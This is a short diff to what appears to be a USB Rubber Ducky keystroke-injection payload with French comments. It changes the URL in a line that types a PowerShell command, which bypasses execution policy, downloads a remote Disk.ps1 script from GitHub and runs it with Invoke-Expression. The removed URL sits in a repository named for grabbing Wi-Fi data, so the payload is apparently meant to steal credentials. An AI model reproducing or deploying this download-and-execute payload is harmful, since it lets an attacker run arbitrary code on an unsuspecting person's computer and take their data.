@@ -8,7 +8,7 @@ ENTER
 DELAY 700
 
 REM Téléchargement et exécution du script powershell
-STRING powershell -ExecutionPolicy Bypass -Command "(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kali3159/WifiGrabber_result/main/Disk.ps1?token=GHSAT0AAAAAACN7I7EUTDNMY7XIXGRTUN2WZOFIXOA') | Invoke-Expression"
+STRING powershell -ExecutionPolicy Bypass -Command "(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kali3159/Script-Rubber-Ducky/main/Disk.ps1') | Invoke-Expression"
 ENTER
 
 REM Fermeture du CMD
